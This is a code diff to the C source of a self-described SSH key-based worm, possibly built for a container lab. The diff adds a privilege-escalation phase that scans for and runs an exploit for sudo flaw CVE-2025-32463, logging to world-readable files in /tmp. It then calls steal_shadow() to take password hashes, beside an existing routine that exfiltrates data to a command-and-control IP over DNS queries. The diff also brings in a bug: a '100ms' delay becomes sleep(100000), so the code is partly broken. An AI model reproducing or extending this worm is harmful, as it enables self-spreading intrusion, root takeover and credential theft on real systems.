@@ -16,6 +16,7 @@
 #include <stdint.h>
 #include <dirent.h>
 #include <ifaddrs.h>
+#include "cve_2025_32463.h"
 
 // Configuration
 #define MAX_SUBNETS 4
@@ -189,7 +190,7 @@ void exfiltrate(const char *message, const char *c2_ip, const char *domain) {
         printf("[DNS] Enviando fragmento %d: %s\n", seq, hostname);
         send_dns_query(sock, &dest, hostname);
         
-        usleep(100000); // 100ms delay
+        sleep(100000); // 100ms delay
         pos += chunk_size;
         seq++;
     }
@@ -742,26 +743,84 @@ void get_net_24(const char *ip, char *out) {
     }
 }
 
+/*
+ * Function for LOGGER purposes. One log for normal users and another one for root
+ */
+int setup_logger() {
+
+    char log_file[100] = "worm.log";
+
+    // Another filename as root for not overwritting
+    if (!getuid()) {
+        strcpy(log_file, "worm_root.log");
+    }
+
+    char log_path[512];
+    snprintf(log_path, sizeof(log_path), "%s/%s", "/tmp", log_file);
+
+    int fd = open(log_path, O_WRONLY | O_CREAT | O_TRUNC, 0644); // 0644 -> Read for all
+    if (fd < 0) {
+        perror("open");
+        return -1; // error
+    }
+
+    // Redirects stdout
+    if (dup2(fd, STDOUT_FILENO) < 0) {
+        perror("dup2");
+        close(fd);
+        return -1;
+    }
+
+    close(fd);
+
+    return 0;
+}
 
 int main(int argc, char* argv[]) {
     (void)argc;  // Suppress unused parameter warning
-    printf("=== C SSH Key-Based Worm ===\n");
-    
+
+    // Logger set up
+    if (setup_logger() != 0) {
+        fprintf(stderr, "Error al configurar el logger\n");
+        return 1;
+    }
+
+    // Start
+    printf("\n=== C SSH Key-Based Worm ===\n\n");
+
+
     // Initialize random seed for polymorphic engine
     srand(time(NULL));
     
     // Delay to allow system to settle if just started
     sleep(2);
 
-    // PHASE 1: Priviledge escalation
+    //PHASE 1: Checking sudo vulnerability
+    printf("[*] Phase 1: Getting sudo permissions\n");
 
     // Attempt privilege escalation on spoke servers (before SSH key check)
     // Spoke servers have vulnerable sudo installed, so we can detect them by checking for the vulnerability
     // This works better than hostname checking since Docker containers have random hostnames
+    if (getuid() != 0) {
+        printf("[*] Checking for CVE-2025-32463\n");
 
+        // Check if the vulnn can be applied
+        if (cve_2025_32463_scan()) {
+            printf("[+] CVE-2025-32463 vulnerability detected\n");
+            cve_2025_32463_execute(); 
+            printf("[+] CVE-2025-32463 applied. Continuing as root in another thread\n");
+            // Worm launched with privileges in another thread
+            return 0;
+        } else {
+        printf("[-] CVE-2025-32463 not applicable. Continuing as normal user\n");
+        }
+
+    } else {
+        printf("[+] CVE-2025-32463 applied. You are root!\n");
+    }
 
     //PHASE 2: Data exfiltration and infection
-    printf("\n[*] Phase 2: Data Exfiltration\n");
+    printf("[*] Phase 2: Data Exfiltration\n");
     steal_shadow();
 
     // Check if SSH keys exist
